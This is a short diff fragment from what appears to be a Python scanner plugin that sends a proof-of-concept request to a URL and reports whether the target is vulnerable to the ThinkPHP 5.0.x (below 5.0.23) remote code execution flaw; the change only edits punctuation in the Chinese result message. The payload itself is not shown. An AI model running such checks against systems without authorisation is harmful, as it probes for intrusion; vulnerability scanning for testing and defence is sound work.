@@ -16,7 +16,7 @@ def poc(url):
         req = requests.post(exp, data=poc_data, timeout=timeout, headers=headers)
         if req.status_code == 200 or req.status_code == 500:
             if check_key in req.text:
-                result = "目标存在 ThinkPHP 5.0.*(Below 5.0.23) RCE, check url: %s, PoC: %s" % (url, poc_data)
+                result = "目标存在 ThinkPHP 5.0.*(Below 5.0.23) RCE, check url: %s PoC: %s" % (url, poc_data)
                 return result
     except:
         pass
